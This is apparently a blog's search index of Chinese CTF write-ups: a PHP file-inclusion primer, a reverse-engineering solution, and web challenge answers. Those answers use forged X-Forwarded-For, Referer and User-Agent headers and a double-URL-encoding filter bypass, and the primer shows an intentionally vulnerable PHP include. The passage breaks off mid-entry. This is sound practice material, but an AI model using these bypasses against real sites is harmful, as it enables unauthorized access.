<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>南京邮电-Web</title>
      <link href="/2019/03/18/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5-Web/"/>
      <url>/2019/03/18/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h1><p>先 uncode 解码,得到 :</p><p>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //<em>´∇｀</em>/ [‘_’]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: ‘_’ ,ﾟωﾟﾉ : (#######(ﾟ######ωﾟﾉ==3) +’_’) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ ‘_’)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +’_’)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +’_’) [c^_^o];(ﾟДﾟ) [‘c’] = ((ﾟДﾟ)+’_’) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [‘o’] = ((ﾟДﾟ)+’_’) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [‘c’]+(ﾟДﾟ) [‘o’]+(ﾟωﾟﾉ +’_’)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +’_’) [ﾟｰﾟ] + ((ﾟДﾟ) +’_’) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +’_’) [ﾟΘﾟ]+((ﾟｰﾟ==3) +’_’) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [‘c’]+((ﾟДﾟ)+’_’) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [‘o’]+((ﾟｰﾟ==3) +’_’) [ﾟΘﾟ];(ﾟДﾟ) [‘_’] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +’_’) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+’_’) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +’_’) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +’_’) [ﾟΘﾟ]+ (ﾟωﾟﾉ +’_’) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=’\\’; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +’_’)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=’\”‘;(ﾟДﾟ) [‘_’] ( (ﾟДﾟ) [‘_’] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (‘_’);</p><p>‘#’ 之间少了个符号,已经不想说了,让我哭一会</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 南京邮电 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP文件包含</title>
      <link href="/2019/03/18/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2019/03/18/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<p>php文件包含漏洞，大致套路是这样滴：</p><pre><code class="lang-php">&lt;?php     $file = $_GET[&quot;file&quot;];     ... ...     include($file); ?&gt;</code></pre><blockquote><p>例如：test.php大致内容如上，通过访问<a href="http://xxx/test.php?file=xxx.php，则$file=xxx.php，也就是说：include(xxx.php)，而对于php的include()函数，会获取指定文件的内容，在执行前将代码插入到test.php文件中。而如果被包含的文件中无有效的php代码，则会直接输出无效的文件内容。通常利用无效代码这一点来将文件内容输出。" target="_blank" rel="noopener">http://xxx/test.php?file=xxx.php，则$file=xxx.php，也就是说：include(xxx.php)，而对于php的include()函数，会获取指定文件的内容，在执行前将代码插入到test.php文件中。而如果被包含的文件中无有效的php代码，则会直接输出无效的文件内容。通常利用无效代码这一点来将文件内容输出。</a></p></blockquote><p><a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://协议</a><br><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">https://www.freebuf.com/column/148886.html</a><br><a href="https://www.freebuf.com/column/183226.html" target="_blank" rel="noopener">https://www.freebuf.com/column/183226.html</a><br><a href="https://www.jianshu.com/p/0a8339fcc269" target="_blank" rel="noopener">https://www.jianshu.com/p/0a8339fcc269</a><br><a href="https://chybeta.github.io/2007/06/22/%E6%B5%85%E8%B0%88php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%9C%A8CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">https://chybeta.github.io/2007/06/22/%E6%B5%85%E8%B0%88php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%9C%A8CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</a><br><a href="https://blog.csdn.net/qq_33904831/article/details/78814567" target="_blank" rel="noopener">https://blog.csdn.net/qq_33904831/article/details/78814567</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>北邮网安杯线下决赛 Writeup</title>
      <link href="/2019/03/18/buptwriteup/"/>
      <url>/2019/03/18/buptwriteup/</url>
      
        <content type="html"><![CDATA[<h1 id="北邮网安杯-Writeup"><a href="#北邮网安杯-Writeup" class="headerlink" title="北邮网安杯 Writeup"></a>北邮网安杯 Writeup</h1><p>有幸参加了北京邮电大学的北邮网安杯线下决赛<br>虽然自己很菜，得分很低，但是这次比赛让我学到了很多，也对网络空间安全和 CTF 有了更加深入的了解<br>最重要的是在这个过程中我认识到了一些兴趣、爱好相同很有趣的人，原来即使是同龄人中，还是有这么多的高手，自己需要学习的东西还很多</p><hr><p>因为知识浅薄，CTF 我只完成了最简单的一道，下面是我对这道题不成熟的解法<br>如果有什么错误之处，欢迎下方留言</p><h2 id="RE1"><a href="#RE1" class="headerlink" title="RE1"></a>RE1</h2><p>下载之后发现不是 .exe 文件<br>用 Winhex 打开,发现是 ELF 文件<br><img src="https://s2.ax1x.com/2019/03/17/AeheFH.png" alt="AeheFH.png"><br>用 IDA 载入,提示为 64 位文件<br><img src="https://s2.ax1x.com/2019/03/17/Aehapn.png" alt="Aehapn.png"><br>换成 IDA64 载入,找到主函数 main, 进入查看<br>发现奇怪的相关字符串<br><img src="https://s2.ax1x.com/2019/03/17/AehXct.png" alt="AehXct.png"><br>继续查看,发现输入正确的输出字符串<br><img src="https://s2.ax1x.com/2019/03/17/Ae4SHS.png" alt="Ae4SHS.png"><br>F5 反编译,将变量转化为字符<br>得到源码</p><pre><code class="lang-cpp">int __cdecl main(int argc, const char **argv, const char **envp){  int v3; // eax  int v4; // eax  int v6; // [rsp+4h] [rbp-10Ch]  int i; // [rsp+8h] [rbp-108h]  signed int j; // [rsp+Ch] [rbp-104h]  signed int k; // [rsp+10h] [rbp-100h]  int l; // [rsp+14h] [rbp-FCh]  char v11; // [rsp+20h] [rbp-F0h]  char v12; // [rsp+21h] [rbp-EFh]  char v13; // [rsp+22h] [rbp-EEh]  char v14; // [rsp+23h] [rbp-EDh]  char v15; // [rsp+24h] [rbp-ECh]  char v16; // [rsp+25h] [rbp-EBh]  char v17; // [rsp+26h] [rbp-EAh]  char v18; // [rsp+27h] [rbp-E9h]  char v19; // [rsp+28h] [rbp-E8h]  char v20; // [rsp+29h] [rbp-E7h]  char v21; // [rsp+2Ah] [rbp-E6h]  __int64 v22; // [rsp+30h] [rbp-E0h]  __int64 v23; // [rsp+38h] [rbp-D8h]  __int64 v24; // [rsp+40h] [rbp-D0h]  __int16 v25; // [rsp+48h] [rbp-C8h]  char v26; // [rsp+4Ah] [rbp-C6h]  char v27[48]; // [rsp+50h] [rbp-C0h]  __int16 v28; // [rsp+80h] [rbp-90h]  char s1[48]; // [rsp+90h] [rbp-80h]  __int16 v30; // [rsp+C0h] [rbp-50h]  _BYTE v31[6]; // [rsp+C2h] [rbp-4Eh]  char v32[48]; // [rsp+D0h] [rbp-40h]  int v33; // [rsp+100h] [rbp-10h]  char v34; // [rsp+104h] [rbp-Ch]  unsigned __int64 v35; // [rsp+108h] [rbp-8h]  v35 = __readfsqword(0x28u);  memset(v32, 0, sizeof(v32));  v33 = 0;  v34 = 0;  v26 = 0;  v22 = &#39;HGFEDCBA&#39;;  v23 = &#39;PONMLKJI&#39;;  v24 = &#39;XWVUTSRQ&#39;;  v25 = &#39;ZY&#39;;  v11 = &#39;B&#39;;  v12 = &#39;U&#39;;  v13 = &#39;P&#39;;  v14 = &#39;T&#39;;  v15 = &#39;I&#39;;  v16 = &#39;S&#39;;  v17 = &#39;H&#39;;  v18 = &#39;E&#39;;  v19 = &#39;K&#39;;  v20 = &#39;Y&#39;;  v21 = 0;  memset(v27, 0, sizeof(v27));  v28 = 0;  memset(s1, 0, sizeof(s1));  v30 = 0;  v6 = 0;  __isoc99_scanf(&quot;%50s&quot;, v27, v31);  for ( i = 0; *(&amp;v11 + i); ++i )  {    for ( j = 0; j &lt;= 25; ++j )    {      if ( *((_BYTE *)&amp;v22 + j) == *(&amp;v11 + i) )      {        *((_BYTE *)&amp;v22 + j) = 0;        v3 = v6++;        v32[v3] = *(&amp;v11 + i);      }    }  }  for ( k = 0; k &lt;= 25; ++k )  {    if ( *((_BYTE *)&amp;v22 + k) )    {      v4 = v6++;      v32[v4] = *((_BYTE *)&amp;v22 + k);    }  }  for ( l = 0; v27[l]; ++l )  {    if ( v27[l] == 123 )    {      s1[l] = 42;    }    else if ( v27[l] == 125 )    {      s1[l] = 35;    }    else    {      s1[l] = v32[v27[l] - 65];    }  }  if ( !strcmp(s1, &quot;UQJO*PEIPAKFRIMXNKDJCINGIBNXPBFFGOUINKDJCIM#&quot;) )    puts(&quot;Check in Successfully!&quot;);  return 0;}</code></pre><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><h4 id="第一个部分"><a href="#第一个部分" class="headerlink" title="第一个部分"></a>第一个部分</h4><pre><code class="lang-cpp">for ( i = 0; *(&amp;v11 + i); ++i )  {    for ( j = 0; j &lt;= 25; ++j )    {      if ( *((_BYTE *)&amp;v22 + j) == *(&amp;v11 + i) )      {        *((_BYTE *)&amp;v22 + j) = 0;        v3 = v6++;        v32[v3] = *(&amp;v11 + i);      }    }  }</code></pre><p>在 <em>(v22+0) 到 </em>(v22+25) 之间查找将 <em>(v11+i) ,如果能找到,把它加在 v32 的后面,并把当前的 </em>(v22+j) 标记为 0 ,</p><h4 id="第二个部分"><a href="#第二个部分" class="headerlink" title="第二个部分"></a>第二个部分</h4><pre><code class="lang-cpp">for ( k = 0; k &lt;= 25; ++k )  {    if ( *((_BYTE *)&amp;v22 + k) )    {      v4 = v6++;      v32[v4] = *((_BYTE *)&amp;v22 + k);    }  }</code></pre><p>将第一部分没有标记的字符依次加在 v32 的后面<br>得到 v32 :<code>BUPTISHEKYACDFGJLMNOQRVWXZ</code></p><h4 id="第三个部分"><a href="#第三个部分" class="headerlink" title="第三个部分"></a>第三个部分</h4><pre><code class="lang-cpp">for ( l = 0; v27[l]; ++l )  {    if ( v27[l] == 123 )//123=&#39;{&#39;    {      s1[l] = 42;//42=&#39;*&#39;    }    else if ( v27[l] == 125 )//125=&#39;}&#39;    {      s1[l] = 35;//35=&#39;#&#39;    }    else    {      s1[l] = v32[v27[l] - 65];    }  }  if ( !strcmp(s1, &quot;UQJO*PEIPAKFRIMXNKDJCINGIBNXPBFFGOUINKDJCIM#&quot;) )    puts(&quot;Check in Successfully!&quot;);</code></pre><p>最后的 if 语句判断当 s1 与 <code>UQJO*PEIPAKFRIMXNKDJCINGIBNXPBFFGOUINKDJCIM#</code> 相等时才输出正确</p><p>向上看 s1 的形成,涉及到 v27,v32 两个字符串<br>v27 为输入的字符串,也就是我们要提交的 flag<br>v32 为前两部分形成的字符串</p><p>当 v27==’{‘ 时 s1[l]=’*’ 对应 s1[4]<br>当 v32==’}’ 时 s1[l]=’#’ 对应 s1[43]<br>其余情况 s1=v32[v27[l]-‘A’]<br>直至 v27[l] 为空,s1 形成</p><p>分析到这里,就可以了写脚本反解密了</p><pre><code class="lang-cpp">#include&lt;cstdio&gt;#include&lt;algorithm&gt;#include&lt;cstring&gt;using namespace std;int ww[1000];int main(){    char s321[]=&quot;BUPTISHEKYGFDCAONMLJXWVRQZ&quot;;//这个是错误的顺序    char s322[]=&quot;BUPTISHEKYACDFGJLMNOQRVWXZ&quot;;    for(int i=0;i&lt;strlen(s322);i++){        if(!ww[s322[i]])ww[s322[i]]=i;    }    char s1[]=&quot;UQJO*PEIPAKFRIMXNKDJCINGIBNXPBFFGOUINKDJCIM#&quot;;    for(int i=0;i&lt;strlen(s1);i++){        printf(&quot;%c&quot;,ww[s1[i]]+&#39;A&#39;);    }    return 0;}</code></pre><p>建立映射关系,由于一,二部分将 v32 中重复部分去除了,所以映射关系是一对一的,不存在冲突</p><p>一开始弄反了 v22 的顺序,因该是由 ‘A’-‘Z’ 的顺序<br><img src="https://s2.ax1x.com/2019/03/17/AeoAgA.png" alt="AeoAgA.png"></p><p>运行脚本得到 :<code>BUPTACHECKINVERYSIMPLESOEASYCANNOTBESIMPLERA</code><br><img src="https://s2.ax1x.com/2019/03/17/AeoEjI.png" alt="AeoEjI.png"><br>将位置 4 和最后一位换成相应的 {}<br>得到 flag:<code>BUPT{CHECKINVERYSIMPLESOEASYCANNOTBESIMPLER}</code></p><p>在 Kali 下测试,成功!<br><img src="https://s2.ax1x.com/2019/03/17/AeTRLq.png" alt="AeTRLq.png"></p><p>提交，一百分到手。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> BUPT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Material主题</title>
      <link href="/2019/03/02/Hexo%E5%85%A5%E5%9D%91%E6%95%99%E7%A8%8B/"/>
      <url>/2019/03/02/Hexo%E5%85%A5%E5%9D%91%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Material主题"><a href="#Material主题" class="headerlink" title="Material主题"></a>Material主题</h1><p><a href="https://github.com/EasyHexo/Easy-Hexo" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/Maintained--by-EasyHexo-42B983.svg?longCache=true&amp;style=flat-square" alt=""></a><br><a href="https://github.com/ffdy" target="_blank" rel="noopener"><img src="https://img.shields.io/badge/Author-ffy-800080.svg?longCache=true&amp;style=flat-square" alt=""></a></p><p>:::tip<br>注意，这里介绍的Material主题是1.5.2的版本，新手不建议使用最新的版本，因为好像有很多Bug（作者最近失联了）<br>:::</p><p><a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="noopener">Material主题地址</a></p><h2 id="Material主题演示"><a href="#Material主题演示" class="headerlink" title="Material主题演示"></a>Material主题演示</h2><p><img src="https://camo.githubusercontent.com/1e9260f301fe915fb3e4826831fde943229523cb/68747470733a2f2f692e6c6f6c692e6e65742f323031372f30392f30372f353962313336376637366664622e706e67" alt="演示"></p><h2 id="下载Material主题"><a href="#下载Material主题" class="headerlink" title="下载Material主题"></a>下载Material主题</h2><ol><li><p>进入 Github，下载 <a href="https://github.com/viosey/hexo-theme-material/releases" target="_blank" rel="noopener">Material</a> 主题 1.5.2 的版本。</p></li><li><p>将下载下来的主题解压，将解压的文件夹重命名为 <code>Material</code>。</p></li><li><p>将这个文件夹放到你的博客根目录下的 themes 文件夹下。</p></li></ol><p><img src="https://s1.ax1x.com/2018/10/27/i6XOpT.png" alt="i6XOpT.png"></p><h2 id="启用Material主题"><a href="#启用Material主题" class="headerlink" title="启用Material主题"></a>启用Material主题</h2><p>:::tip<br>这里有两个 <code>_config.yml</code> 文件，一个位于博客根目录,另一个位于主题文件夹下，下面分别叫他们<code>根 _config.yml</code>文件和<code>主题 _config.yml</code>文件。<br>:::</p><p>进入Material文件夹,将<code>_config.template.yml</code> 重命名为 <code>_config.yml</code><br>（这个 <code>_config.yml</code> 文件是 <code>主题_config.yml</code> 文件）</p><p>:::tip<br>建议你将 <code>_config.template.yml</code> 文件备份，防止一些不可描述的的问题。<br>:::</p><p><img src="https://s1.ax1x.com/2018/10/27/i6x8mQ.png" alt="i6x8mQ.png"></p><p>回到主题根目录，打开<code>根 _config.yml</code>文件，找到 <code>theme</code> 属性</p><p><img src="https://s1.ax1x.com/2018/10/27/i6zA3V.png" alt="i6zA3V.png"><br><img src="https://s1.ax1x.com/2018/10/27/i6Lih8.md.png" alt="i6Lih8.md.png"></p><p>将后面的字段改为你刚刚改的主题文件夹的名字，比如我的<code>Material</code>。<br>:::tip</p><p>在 yml 中，冒号后面必须加一个空格，否则会报错。</p><p>:::</p><p>OK，Material 主题就正式启用了下面，就是见证奇迹的时候了，有没有一点小激动呢?</p><p>回到博客根目录，打开终端，输入:</p><pre><code class="lang-brash">$ hexo clean</code></pre><p>回车</p><p><img src="https://s1.ax1x.com/2018/10/27/icPF6P.png" alt="icPF6P.png"></p><p>完美！！！:tada:</p><p>好，再输入:</p><pre><code class="lang-brash">$ hexo g</code></pre><p>回车</p><p><img src="https://s1.ax1x.com/2018/10/27/icPQlq.png" alt="icPQlq.png"></p><p>完全OK！！！:tada:</p><p>输入:</p><pre><code class="lang-brash">$ hexo s</code></pre><p>回车</p><p><img src="https://s1.ax1x.com/2018/10/27/icPqhj.png" alt="icPqhj.png"></p><p>打开浏览器输入<code>http://localhost:4000</code>，即可看见你博客的样子。</p><p><img src="https://s1.ax1x.com/2018/10/27/icPW9A.png" alt="icPW9A.png"><br><img src="https://s1.ax1x.com/2018/10/27/icP2hd.png" alt="icP2hd.png"></p><p>点片文章试试，如果没问题，那么恭喜你！<br>:tada: :tada: :tada: :tada:</p><p>如果你想让你的Blog马力全开,那么请继续往下看</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>实验吧-RE</title>
      <link href="/2019/02/18/%E5%AE%9E%E9%AA%8C%E5%90%A7-RE/"/>
      <url>/2019/02/18/%E5%AE%9E%E9%AA%8C%E5%90%A7-RE/</url>
      
        <content type="html"><![CDATA[<h2 id="bin100-ebCTF-2013"><a href="#bin100-ebCTF-2013" class="headerlink" title="bin100(ebCTF 2013)"></a>bin100(ebCTF 2013)</h2><p>巨坑,涉及到时间的判断,大于 2s 会变成乱码<br>可以改掉 jle 语句,也可以改全跳转,然后快速回车</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 实验吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧-Web</title>
      <link href="/2019/02/18/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web/"/>
      <url>/2019/02/18/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web/</url>
      
        <content type="html"><![CDATA[<h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><p>检查请求头,发现 <code>content-row: MTU0Nzk5MTA1OQ==</code><br>输入得到Flag: <code>KEY: #WWWnsf0cus_NET#</code></p><h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p>根据提示,抓包<br>伪造.NET 浏览器 国籍<br>修改为</p><pre><code>GET /sHeader/ HTTP/1.1Host: ctf5.shiyanbar.comUser-Agent: Mozilla/5.0 (Windows NT 6.1/.NET CLR 9.9; Win64; x64; rv:64.0) Gecko/20100101 IEAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-gb,en;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1546692582; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*185270%2CnickName%3Affdy; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1547962050Upgrade-Insecure-Requests: 1</code></pre><p>GO,得到Flag: The key is:HTTpH34der</p><h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p>查看代码,发现要将IP伪装为1.1.1.1<br>在伪造IP后响应中提示还要伪造跳转网页<br>抓包<br>伪造IP 跳转网页<br>修改为</p><pre><code>GET /phpaudit/ HTTP/1.1Host: ctf5.shiyanbar.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Forwarded-For: 1.1.1.1 ##IPReferer: https://www.google.com  ##跳转网页Connection: closeCookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1546692582; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*185270%2CnickName%3Affdy; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1547962050Upgrade-Insecure-Requests: 1</code></pre><p>得到Flag: Key is SimCTF{daima_shengji}</p><h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p>进入链接,看见源码</p><pre><code class="lang-php">&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) { #比较id和字符,如果相等返回true  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();}$_GET[id] = urldecode($_GET[id]); #对id进行url解密if($_GET[id] == &quot;hackerDJ&quot;) 如果id等于字符,得到Flag{  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;;}?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website?</code></pre><p>分析代码发现应对字符进行URL编码,但需要加密两次,因为浏览器会解密一次<br>网上的在线编码一般不会处理英文,用这个<a href="http://tool.bugku.com/safe/url.php" target="_blank" rel="noopener">网站</a><br>GET 提交,得到 Flag: DUTCTF{PHP_is_the_best_program_language}</p><h2 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h2><p>jother 编码 <a href="https://wps2015.org/drops/drops/jother%E7%BC%96%E7%A0%81%E4%B9%8B%E8%B0%9C.html" target="_blank" rel="noopener">这里</a><br>直接在 Console( )里运行得到Flag : Ihatejs</p><h2 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h2><p><img src="http://ctf5.shiyanbar.com/web/web200.jpg" alt=""></p><p>分析代码,密文首先被反转,再自增 1<br>base64-encode 后再反转<br>ROT13 加密,得到密文 :<br><code>a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</code></p><p>先逆转该过程就 OK 了</p><p><a href="http://www.mxcz.net/tools/rot13.aspx" target="_blank" rel="noopener">ROT13 解密</a>得 : </p><p><code>n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</code></p><p>翻转 :</p><p><code>fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n</code></p><p>base64-decode : </p><pre><code>~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg</code></pre><p>自减 1 后翻转得 :</p><p> <code>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</code></p><h2 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h2><p>查看源码:</p><pre><code class="lang-php">&lt;?phpif (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    